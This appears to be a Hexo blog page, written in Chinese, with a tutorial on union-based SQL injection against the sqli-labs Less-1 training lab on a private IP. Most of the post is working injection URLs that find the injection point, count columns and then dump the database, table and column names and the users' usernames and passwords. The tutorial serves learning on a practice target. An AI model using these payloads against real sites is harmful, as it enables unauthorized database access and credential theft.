@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="1、Union联合查询含义
+将多条查询语句的结果并成一个结果，unio注入攻击为一种手工测试
+2、Unioon联合注入思路
+
+判断是否存在注入点
+http://192.168.157.1/sqli/Less-1/?id=1
+
+[http://192.168.157.1/sqli/Less-1/?id">
+  
+
+  
+  
+  
+  
+  
+  
+  <title>Union注入攻击 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1、Union联合查询含义 将多条查询语句的结果并成一个结果，unio注入攻击为一种手工测试 2、Unioon联合注入思路  判断是否存在注入点 http://192.168.157.1/sqli/Less-1/?id=1  [http://192.168.157.1/sqli/Less-1/?id=1&amp;#39;](http://192.168.157.1/sqli/Less-1/?id=1 an">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Union注入攻击">
+<meta property="og:url" content="http://yoursite.com/2019/11/09/Union注入攻击/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1、Union联合查询含义 将多条查询语句的结果并成一个结果，unio注入攻击为一种手工测试 2、Unioon联合注入思路  判断是否存在注入点 http://192.168.157.1/sqli/Less-1/?id=1  [http://192.168.157.1/sqli/Less-1/?id=1&amp;#39;](http://192.168.157.1/sqli/Less-1/?id=1 an">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEQiD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEGQA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEwFS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEDzj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEyyn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEqw6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmEjYD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmVp6A.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmV3kT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmV8tU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/09/MmV076.png">
+<meta property="og:updated_time" content="2019-11-09T07:04:26.080Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Union注入攻击">
+<meta name="twitter:description" content="1、Union联合查询含义 将多条查询语句的结果并成一个结果，unio注入攻击为一种手工测试 2、Unioon联合注入思路  判断是否存在注入点 http://192.168.157.1/sqli/Less-1/?id=1  [http://192.168.157.1/sqli/Less-1/?id=1&amp;#39;](http://192.168.157.1/sqli/Less-1/?id=1 an">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/11/09/MmEQiD.png">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+</head></html>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="Hexo" rel="home">Hexo</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-Union注入攻击" class="post-Union注入攻击 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      Union注入攻击
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/11/09/Union注入攻击/" data-id="ck2r84rdg0000icw03k3re35j" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>1、Union联合查询含义</p>
+<p>将多条查询语句的结果并成一个结果，unio注入攻击为一种手工测试</p>
+<p>2、Unioon联合注入思路</p>
+<ul>
+<li><p>判断是否存在注入点</p>
+<p><a href="http://192.168.157.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1</a></p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEQiD.png" alt="\img"></p>
+<p>[<a href="http://192.168.157.1/sqli/Less-1/?id=1&#39;]" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1&#39;]</a>(<a href="http://192.168.157.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1</a> and)</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEGQA.png" alt="\img"></p>
+<p><a href="http://192.168.157.1/sqli/Less-1/?id=1" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1</a> and 1=1</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEwFS.png" alt="\img"></p>
+<p><a href="http://192.168.157.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1&#39;</a> and 1=2–+</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEDzj.png" alt="\img"></p>
+<p>由此可知为字符型</p>
+</li>
+</ul>
+<ul>
+<li><p>用order by 1-99语句来查询该数据表的字段数量</p>
+<p><a href="http://192.168.157.1/sqli/Less-1/?id=1%27%20order%20by%203--+" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1%27%20order%20by%203--+</a></p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEyyn.png" alt="\img"></p>
+<p><a href="http://192.168.157.1/sqli/Less-1/?id=1%27%20order%20by%204--+" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=1%27%20order%20by%204--+</a></p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEqw6.png" alt="\img"></p>
+<p>由此可知字段数为1,2,3</p>
+</li>
+</ul>
+<ul>
+<li><p>利用获得的列数使用联合查询，union select 与前面的字段数找到哦啊数据呈现的位置</p>
+<p><a href="http://192.168.157.1/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=-1%27%20union%20select%201,2,3--+</a></p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmEjYD.png" alt="\img"></p>
+</li>
+<li><p>根据显示内容确定查询语句的位置，利用information_schema依次进行查询schemata、tables、columns</p>
+<p>爆数据库：<a href="http://192.168.157.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=-1&#39;</a> union select 1,database(),3–+</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmVp6A.png" alt="\img"></p>
+<p>爆表名：<a href="http://192.168.157.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmV3kT.png" alt="\img"></p>
+<p>爆字段名：<a href="http://192.168.157.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3–+</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmV8tU.png" alt="\img"></p>
+</li>
+<li><p>已知库名、表名字段名，接下来就是爆数据</p>
+<p>爆数据：<a href="http://192.168.157.1/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.157.1/sqli/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(username,password)from security.users),3–+</p>
+<p><img src="https://s2.ax1x.com/2019/11/09/MmV076.png" alt="\img"></p>
+</li>
+</ul>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/11/09/Union注入攻击/">
+    <time datetime="2019-11-09T07:04:25.762Z" class="entry-date">
+        2019-11-09
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2019/11/09/sql注入的原理/" rel="next">sql注入的原理 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2019/11/09/Union注入攻击/">Union注入攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/09/sql注入的原理/">sql注入的原理</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/08/Metasploit的简单用法/">Metasploit的简单用法</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/08/sql/">sqlmap的简单用法</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/02/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2019 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
